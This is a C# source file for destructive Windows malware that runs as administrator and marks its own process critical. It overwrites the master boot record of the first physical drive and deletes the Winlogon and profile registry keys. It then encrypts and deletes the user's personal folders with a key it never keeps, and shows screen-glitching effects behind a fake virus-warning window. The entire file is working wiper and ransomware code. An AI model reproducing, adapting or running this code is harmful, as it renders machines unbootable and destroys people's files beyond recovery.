using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;
using System.Drawing;
using System.Media;
using System.Net;
using System.Windows.Forms;
using System.IO;
using System.Security.Cryptography;

namespace MbrOverwriter
{
    public static class Class1
    {
        [DllImport("kernel32")]
        private static extern IntPtr CreateFile(
            string lpFileName, uint dwDesiredAccess, uint dwShareMode,
            IntPtr lpSecurityAttributes, uint dwCreationDisposition, uint dwFlagsAndAttributes, IntPtr hTemplateFile);

        [DllImport("kernel32")]
        private static extern bool WriteFile(
            IntPtr hFile, byte[] lpBuffer, uint nNumberOfBytesToWrite,
            out uint lpNumberOfBytesWritten, IntPtr lpOverlapped);

        private const uint GenericRead = 0x80000000;
        private const uint GenericWrite = 0x40000000;
        private const uint GenericExecute = 0x20000000;
        private const uint GenericAll = 0x10000000;

        private const uint FileShareRead = 0x1;
        private const uint FileShareWrite = 0x2;
        private const uint OpenExisting = 0x3;

        private const uint MbrSize = 512u;

        public static void OverwriteMBR()
        {
            var mbrData = new byte[]
            {
0x31, 0xC0, 0x8E, 0xD8, 0x8E, 0xC0, 0xBB, 0x00, 0xB8, 0x8E, 0xC3, 0xE8, 0x10, 0x00, 0x31, 0xF6,
0xE8, 0x17, 0x00, 0xE8, 0x2D, 0x00, 0xE8, 0x3D, 0x00, 0x83, 0xC6, 0x05, 0xEB, 0xF2, 0xBF, 0x00,
0x00, 0xB9, 0xD0, 0x07, 0xB8, 0x20, 0x07, 0xF3, 0xAB, 0xC3, 0xBF, 0x00, 0x00, 0xB9, 0x88, 0x13,
0x31, 0xC0, 0x89, 0xFB, 0x01, 0xF3, 0x83, 0xE3, 0x7F, 0x88, 0xD8, 0x0C, 0x40, 0x88, 0xDC, 0xAB,
0xE2, 0xF0, 0xC3, 0xB0, 0x03, 0xE6, 0x43, 0xB0, 0x00, 0xE6, 0x40, 0xB0, 0xFF, 0xE6, 0x40, 0xE4,
0x61, 0x0C, 0x03, 0xE6, 0x61, 0xC3, 0xB9, 0xFF, 0xFF, 0x49, 0x75, 0xFD, 0xC3, 0xE4, 0x40, 0xC3,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x55, 0xAA

            };

            var mbr = CreateFile("\\\\.\\PhysicalDrive0", GenericAll, FileShareRead | FileShareWrite, IntPtr.Zero, OpenExisting, 0, IntPtr.Zero);
            WriteFile(mbr, mbrData, MbrSize, out uint lpNumberOfBytesWritten, IntPtr.Zero);
        }
    }
}




namespace reG
{
    public class Program
    {
        public static void REGEDIT1()
        {

            string command = @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList"" /f";

            var processInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = System.Diagnostics.Process.Start(processInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    System.Console.WriteLine("Output: " + output);
                }
                if (!string.IsNullOrEmpty(error))
                {
                    System.Console.WriteLine("Errore: " + error);
                }
            }
        }
    }
}

namespace reG2
{
    public class Program
    {
        public static void REGEDIT2()
        {

            string command = @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileService"" /f";

            var processInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = System.Diagnostics.Process.Start(processInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    System.Console.WriteLine("Output: " + output);
                }
                if (!string.IsNullOrEmpty(error))
                {
                    System.Console.WriteLine("Errore: " + error);
                }
            }
        }
    }
}


namespace reG3
{
    public class Program
    {
        public static void REGEDIT3()
        {
       
            string command = @"reg delete ""HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"" /f";

            var processInfo = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            using (var process = System.Diagnostics.Process.Start(processInfo))
            {
                string output = process.StandardOutput.ReadToEnd();
                string error = process.StandardError.ReadToEnd();
                process.WaitForExit();

                if (!string.IsNullOrEmpty(output))
                {
                    System.Console.WriteLine("Output: " + output);
                }
                if (!string.IsNullOrEmpty(error))
                {
                    System.Console.WriteLine("Errore: " + error);
                }
            }
        }
    }
}

namespace RANSOMWARE
{
    public static class PAY
    {

        public static byte[] GenerateKey()
        {
            using (Aes aes = Aes.Create())
            {
                aes.GenerateKey();
                return aes.Key;
            }
        }

        private static void EncryptFile(byte[] key, string filename)
        {
            try
            {
                byte[] encryptedData;
                using (Aes aes = Aes.Create())
                {
                    aes.Key = key;
                    aes.GenerateIV();
                    using (FileStream inputFileStream = new FileStream(filename, FileMode.Open, FileAccess.Read))
                    {
                        using (MemoryStream encryptedMemoryStream = new MemoryStream())
                        {
                            using (CryptoStream cryptoStream = new CryptoStream(encryptedMemoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
                            {
                                inputFileStream.CopyTo(cryptoStream);
                            }
                            encryptedData = encryptedMemoryStream.ToArray();
                        }
                    }
                }

              
                string encryptedFileName = filename + ".43";
                File.WriteAllBytes(encryptedFileName, encryptedData);
                File.Delete(filename);
                Console.WriteLine($"Encrypted: {filename}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error encrypting file {filename}: {ex.Message}");
            }
        }

   
        private static void EncryptFilesInDirectory(byte[] key, string directoryPath)
        {
            try
            {
            
                string[] files = Directory.GetFiles(directoryPath);
                foreach (string file in files)
                {
                    EncryptFile(key, file);
                }

          
                string[] subdirectories = Directory.GetDirectories(directoryPath);
                foreach (string subdirectory in subdirectories)
                {
                    EncryptFilesInDirectory(key, subdirectory);
                }
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine($"Access denied to directory: {directoryPath}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error processing directory {directoryPath}: {ex.Message}");
            }
        }

        
        public static void EncryptUserDirectories()
        {
         
            string userProfile = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
            string[] targetDirectories = {
                Path.Combine(userProfile, "Desktop"),
                Path.Combine(userProfile, "Documents"),
                Path.Combine(userProfile, "Videos"),
                Path.Combine(userProfile, "Downloads"),
                Path.Combine(userProfile, "Pictures"),
                Path.Combine(userProfile, "Music")
            };

            
            byte[] key = GenerateKey();

            foreach (string directory in targetDirectories)
            {
                if (Directory.Exists(directory))
                {
                    Console.WriteLine($"Processing directory: {directory}");
                    EncryptFilesInDirectory(key, directory);
                }
                else
                {
                    Console.WriteLine($"Directory not found: {directory}");
                }
            }
        }
    }
}


namespace MANDELBROT
{
    class Program
    {
        [DllImport("user32.dll")]
        static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern IntPtr CreateCompatibleBitmap(IntPtr hdc, int width, int height);

        [DllImport("gdi32.dll")]
        static extern IntPtr SelectObject(IntPtr hdc, IntPtr hgdiobj);

        [DllImport("gdi32.dll")]
        static extern bool DeleteObject(IntPtr hObject);

        [DllImport("gdi32.dll")]
        static extern bool DeleteDC(IntPtr hdc);

        [DllImport("gdi32.dll")]
        static extern bool BitBlt(IntPtr hdc, int x, int y, int cx, int cy, IntPtr hdcSrc, int x1, int y1, int rop);

        [DllImport("gdi32.dll")]
        static extern int SetDIBits(IntPtr hdc, IntPtr hbm, uint start, uint cLines, byte[] lpBits, ref BITMAPINFO lpbmi, uint usage);

        const int SRCINVERT = 0x00660046;

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFOHEADER
        {
            public uint biSize;
            public int biWidth;
            public int biHeight;
            public ushort biPlanes;
            public ushort biBitCount;
            public uint biCompression;
            public uint biSizeImage;
            public int biXPelsPerMeter;
            public int biYPelsPerMeter;
            public uint biClrUsed;
            public uint biClrImportant;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct BITMAPINFO
        {
            public BITMAPINFOHEADER bmiHeader;
        }

        public static void ShowEffect()
        {
            IntPtr hdc = GetDC(IntPtr.Zero);
            int width = GetSystemMetrics(0);
            int height = GetSystemMetrics(1);

   
            Thread plasmaThread = new Thread(() => ExtremeLSDPlasma(hdc, width, height));
            Thread audioThread = new Thread(() => Bytebeat.PlayDistortedAudio());

            plasmaThread.Start();
            audioThread.Start();

            plasmaThread.Join();
            audioThread.Join();

            ReleaseDC(IntPtr.Zero, hdc);
        }

        static void ExtremeLSDPlasma(IntPtr hdc, int width, int height)
        {
            IntPtr memDC = CreateCompatibleDC(hdc);
            IntPtr bitmap = CreateCompatibleBitmap(hdc, width, height);
            SelectObject(memDC, bitmap);

            BITMAPINFO bmi = new BITMAPINFO();
            bmi.bmiHeader.biSize = (uint)Marshal.SizeOf(typeof(BITMAPINFOHEADER));
            bmi.bmiHeader.biWidth = width;
            bmi.bmiHeader.biHeight = -height;
            bmi.bmiHeader.biPlanes = 1;
            bmi.bmiHeader.biBitCount = 24;
            bmi.bmiHeader.biCompression = 0;

            byte[] image = new byte[width * height * 3];
            int time = 0;
            var startTime = DateTime.Now;

            while ((DateTime.Now - startTime).TotalSeconds < 10)
            {
                double t = time / 50.0; 
                double zoom = Math.Pow(1.2, time); 

                double centerX = -0.5 + 0.2 * Math.Sin(t); 
                double centerY = 0 + 0.2 * Math.Cos(t);    

                for (int y = 0; y < height; ++y)
                {
                    for (int x = 0; x < width; ++x)
                    {
                     
                        double cRe = (x - width / 2.0) / (300.0 * zoom) + centerX;
                        double cIm = (y - height / 2.0) / (300.0 * zoom) + centerY;
                        double zRe = 0, zIm = 0;
                        int maxIterations = 256, n = 0;

                        while (zRe * zRe + zIm * zIm <= 4 && n < maxIterations)
                        {
                            double tempRe = zRe * zRe - zIm * zIm + cRe;
                            zIm = 2 * zRe * zIm + cIm;
                            zRe = tempRe;
                            n++;
                        }

                        double h = (n * 360.0 / maxIterations) + t * 30;
                        uint color = COLORHSL(h);

                        byte r = (byte)((color >> 16) & 0xFF);
                        byte g = (byte)((color >> 8) & 0xFF);
                        byte b = (byte)(color & 0xFF);

                        image[(y * width + x) * 3 + 0] = b;
                        image[(y * width + x) * 3 + 1] = g;
                        image[(y * width + x) * 3 + 2] = r;
                    }
                }

          
                SetDIBits(memDC, bitmap, 0, (uint)height, image, ref bmi, 0);
                BitBlt(hdc, 0, 0, width, height, memDC, 0, 0, SRCINVERT);

                time++;
                Thread.Sleep(80); 
            }

            DeleteObject(bitmap);
            DeleteDC(memDC);
        }

       
        static uint COLORHSL(double h)
        {
            h = h % 360;
            double s = 1.0, l = 0.5;

            double c = (1 - Math.Abs(2 * l - 1)) * s;
            double x = c * (1 - Math.Abs((h / 60.0) % 2 - 1));
            double m = l - c / 2.0;

            double r1 = 0, g1 = 0, b1 = 0;

            if (h < 60) { r1 = c; g1 = x; }
            else if (h < 120) { r1 = x; g1 = c; }
            else if (h < 180) { g1 = c; b1 = x; }
            else if (h < 240) { g1 = x; b1 = c; }
            else if (h < 300) { r1 = x; b1 = c; }
            else { r1 = c; b1 = x; }

            int r = (int)((r1 + m) * 255);
            int g = (int)((g1 + m) * 255);
            int b = (int)((b1 + m) * 255);

            return (uint)((r << 16) | (g << 8) | b);
        }

        [DllImport("user32.dll", SetLastError = true)]
        static extern int GetSystemMetrics(int nIndex);
    }
}

class Bytebeat
{
    private const int SampleRate = 80;
    private const int DurationSeconds = 10;
    private const int BufferSize = SampleRate * DurationSeconds;

    private static Func<int, int>[] formulas = new Func<int, int>[]
    {
            t =>t*((t>>1)*1)


    };

    public static Func<int, int>[] Formulas { get => formulas; set => formulas = value; }

    private static byte[] GenerateBuffer(Func<int, int> formula)
    {
        byte[] buffer = new byte[BufferSize];
        for (int t = 0; t < BufferSize; t++)
        {
            buffer[t] = (byte)(formula(t) & 0xFF);
        }
        return buffer;
    }

    private static void SaveWav(byte[] buffer, string filePath)
    {
        using (var fs = new FileStream(filePath, FileMode.Create))
        using (var bw = new BinaryWriter(fs))
        {
            bw.Write(new[] { 'R', 'I', 'F', 'F' });
            bw.Write(36 + buffer.Length);
            bw.Write(new[] { 'W', 'A', 'V', 'E' });
            bw.Write(new[] { 'f', 'm', 't', ' ' });
            bw.Write(16);
            bw.Write((short)1);
            bw.Write((short)1);
            bw.Write(SampleRate);
            bw.Write(SampleRate);
            bw.Write((short)1);
            bw.Write((short)8);
            bw.Write(new[] { 'd', 'a', 't', 'a' });
            bw.Write(buffer.Length);
            bw.Write(buffer);
        }
    }

    private static void PlayBuffer(byte[] buffer)
    {
        string tempFilePath = Path.GetTempFileName();
        SaveWav(buffer, tempFilePath);
        using (SoundPlayer player = new SoundPlayer(tempFilePath))
        {
            player.PlaySync();
        }
        File.Delete(tempFilePath);
    }

    public static void PlayDistortedAudio()
    {
        foreach (var formula in Formulas)
        {
            byte[] buffer = GenerateBuffer(formula);
            PlayBuffer(buffer);
        }
    }
}

namespace TEST
{
    class Program
    {
        static Label timerLabel;
        static int remainingTime = 60;

        static System.Timers.Timer countdownTimer;
        static Thread soundThread;
        static Thread cursorThread;
        static Thread invertColorsThread;
        static Thread iconsEffectThread;

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

        [DllImport("user32.dll")]
        private static extern IntPtr GetDC(IntPtr hWnd);

        [DllImport("user32.dll")]
        private static extern int ReleaseDC(IntPtr hWnd, IntPtr hDC);

        [DllImport("gdi32.dll", EntryPoint = "BitBlt", ExactSpelling = true, SetLastError = true)]
        private static extern bool BitBlt(IntPtr hdcDest, int nXDest, int nYDest, int nWidth, int nHeight,
                                          IntPtr hdcSrc, int nXSrc, int nYSrc, uint dwRop);

        [DllImport("user32.dll")]
        private static extern bool SetProcessDPIAware();

        [DllImport("user32.dll")]
        private static extern int GetSystemMetrics(int nIndex);

        const int SPI_SETDESKWALLPAPER = 20;
        const int SPIF_UPDATEINIFILE = 0x01;
        const int SPIF_SENDCHANGE = 0x02;
        private const uint NOTSRCCOPY = 0x00330008;

        const int IconSize = 90;
        const int NumIcons = 30;
        const double Delay = 0.1;

        public static void COMBO()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);

            soundThread = new Thread(PlayErrorSoundInLoop);
            soundThread.IsBackground = true;
            soundThread.Start();

            cursorThread = new Thread(MoveCursorIntensely);
            cursorThread.IsBackground = true;
            cursorThread.Start();

            Form wannacryForm = new Form
            {
                Text = "MalwareLab150 dona 2 euro PLZZZZ",
                Size = new Size(800, 500),
                StartPosition = FormStartPosition.CenterScreen,
                FormBorderStyle = FormBorderStyle.FixedDialog,
                MaximizeBox = false,
                MinimizeBox = false,
                ControlBox = false,
                BackColor = Color.FromArgb(178, 34, 34)
            };

            Panel textPanel = new Panel
            {
                Size = new Size(700, 300),
                Location = new Point(50, 50),
                BackColor = Color.White
            };

            PictureBox keyLogo = new PictureBox
            {
                Size = new Size(100, 100),
                Location = new Point(30, 20),
                Image = new Bitmap(100, 100),
                SizeMode = PictureBoxSizeMode.StretchImage
            };

            using (Graphics g = Graphics.FromImage(keyLogo.Image))
            {
                g.Clear(Color.Transparent);

                Pen keyPen = new Pen(Color.Black, 5);
                g.DrawEllipse(keyPen, 30, 10, 40, 40);
                g.DrawRectangle(keyPen, 40, 50, 20, 40);
                g.DrawRectangle(keyPen, 30, 70, 10, 10);
                g.DrawRectangle(keyPen, 60, 70, 10, 10);
            }

            Label title = new Label
            {
                Text = "YOUR COMPUTER HAS A VIRUS",
                Font = new Font("Consolas", 18, FontStyle.Bold),
                ForeColor = Color.Black,
                AutoSize = true,
                Location = new Point(150, 20)
            };

            Label message = new Label
            {
                Text = "Just press on the remove botton if you want remove this virus that it",
                Font = new Font("Consolas", 12, FontStyle.Regular),
                ForeColor = Color.Black,
                AutoSize = true,
                Location = new Point(50, 70)
            };

            timerLabel = new Label
            {
                Text = "Time Remaining: 10:00",
                Font = new Font("Consolas", 16, FontStyle.Bold),
                ForeColor = Color.Red,
                AutoSize = true,
                Location = new Point(50, 200)
            };

            Button fakePayButton = new Button
            {
                Text = "REMOVE",
                Font = new Font("Consolas", 12, FontStyle.Bold),
                BackColor = Color.Red,
                ForeColor = Color.White,
                Size = new Size(150, 40),
                Location = new Point(550, 250)
            };

            fakePayButton.Click += (sender, args) =>
            {
               
                var audioStream = _2_EURO.Properties.Resources.SOUND3; 
                var backgroundImage = _2_EURO.Properties.Resources.frame; 


        
                PlayAudioFromResource(audioStream);

              
                wannacryForm.BackgroundImage = backgroundImage;
                wannacryForm.BackgroundImageLayout = ImageLayout.Stretch;

                
                SetDesktopWallpaperFromResource(backgroundImage);

      
                invertColorsThread = new Thread(InvertColors);
                invertColorsThread.IsBackground = true;
                invertColorsThread.Start();

                iconsEffectThread = new Thread(ShowRandomIcons);
                iconsEffectThread.IsBackground = true;
                iconsEffectThread.Start();
            };

            textPanel.Controls.Add(title);
            textPanel.Controls.Add(message);
            textPanel.Controls.Add(timerLabel);
            textPanel.Controls.Add(fakePayButton);

            wannacryForm.Controls.Add(keyLogo);
            wannacryForm.Controls.Add(textPanel);

            countdownTimer = new System.Timers.Timer(1000);
            countdownTimer.Elapsed += UpdateTimer;
            countdownTimer.Start();

            Application.Run(wannacryForm);
        }

      
        static void SetDesktopWallpaperFromResource(Image backgroundImage)
        {
            string tempFilePath = Path.Combine(Path.GetTempPath(), "background.jpg");
            backgroundImage.Save(tempFilePath, System.Drawing.Imaging.ImageFormat.Jpeg);
            SystemParametersInfo(SPI_SETDESKWALLPAPER, 0, tempFilePath, SPIF_UPDATEINIFILE | SPIF_SENDCHANGE);
        }

        static void ShowRandomIcons()
        {
            SetProcessDPIAware();

            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics(1);
            IntPtr hdc = GetDC(IntPtr.Zero);
            Graphics graphics = Graphics.FromHdc(hdc);
            Random rand = new Random();
            Icon errorIcon = SystemIcons.Error;
            Icon warningIcon = SystemIcons.Warning;
            Icon information = SystemIcons.Information;

            while (true)
            {
                for (int i = 0; i < NumIcons; i++)
                {
                    int x = rand.Next(0, screenWidth - IconSize);
                    int y = rand.Next(0, screenHeight - IconSize);
                    Icon iconToDraw = (i % 2 == 0) ? errorIcon : warningIcon;
                    Bitmap iconBitmap = iconToDraw.ToBitmap();
                    graphics.DrawImage(iconBitmap, x, y, IconSize, IconSize);
                }
                Thread.Sleep((int)(Delay * 10));
            }
            ReleaseDC(IntPtr.Zero, hdc);
        }

        static void InvertColors()
        {
            SetProcessDPIAware();
            int screenWidth = GetSystemMetrics(0);
            int screenHeight = GetSystemMetrics(1);
            IntPtr hdc = GetDC(IntPtr.Zero);

            while (true)
            {
                BitBlt(hdc, 0, 0, screenWidth, screenHeight, hdc, 0, 0, NOTSRCCOPY);
                Thread.Sleep(0);
            }

            ReleaseDC(IntPtr.Zero, hdc);
        }

        static void PlayAudioFromResource(Stream audioStream)
        {
            SoundPlayer player = new SoundPlayer(audioStream);
            player.PlayLooping();
        }

        static void UpdateTimer(object sender, EventArgs e)
        {
            remainingTime--;
            int minutes = remainingTime / 60;
            int seconds = remainingTime % 60;
            timerLabel.Text = $"Time Remaining: {minutes:D2}:{seconds:D2}";

            if (remainingTime <= 0)
            {
                countdownTimer.Stop();
                timerLabel.Text = "TIME'S UP!";
                Environment.Exit(1);
            }
        }

        static void MoveCursorIntensely()
        {
            Random rand = new Random();
            while (true)
            {
                Cursor.Position = new Point(rand.Next(Screen.PrimaryScreen.Bounds.Width), rand.Next(Screen.PrimaryScreen.Bounds.Height));
                Thread.Sleep(5000);
            }
        }

        static void PlayErrorSoundInLoop()
        {
            while (true)
            {
                SystemSounds.Hand.Play();
                Thread.Sleep(100);
            }
        }
    }
}


class MainProgram
{
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern uint NtSetInformationProcess(IntPtr processHandle, int processInformationClass, ref int processInformation, int processInformationLength);

    const int ProcessBreakOnTermination = 29;
    const int BreakOnTerminationFlag = 1;

    static void Main(string[] args)
    {
        if (!IsAdministrator())
        {
            Console.WriteLine("ADMIN");
            return;
        }

        Process currentProcess = Process.GetCurrentProcess();
        IntPtr handle = currentProcess.Handle;

        int isCritical = BreakOnTerminationFlag;
        uint status = NtSetInformationProcess(handle, ProcessBreakOnTermination, ref isCritical, sizeof(int));

        if (status == 0)
        {
          
        }
        else
        {
            
        }

       
        MbrOverwriter.Class1.OverwriteMBR();
        reG.Program.REGEDIT1();
        reG2.Program.REGEDIT2();
        reG3.Program.REGEDIT3();
        RANSOMWARE.PAY.EncryptUserDirectories();
        MANDELBROT.Program.ShowEffect();
        TEST.Program.COMBO();
    }

    private static bool IsAdministrator()
    {
        var identity = System.Security.Principal.WindowsIdentity.GetCurrent();
        var principal = new System.Security.Principal.WindowsPrincipal(identity);
        return principal.IsInRole(System.Security.Principal.WindowsBuiltInRole.Administrator);
    }
}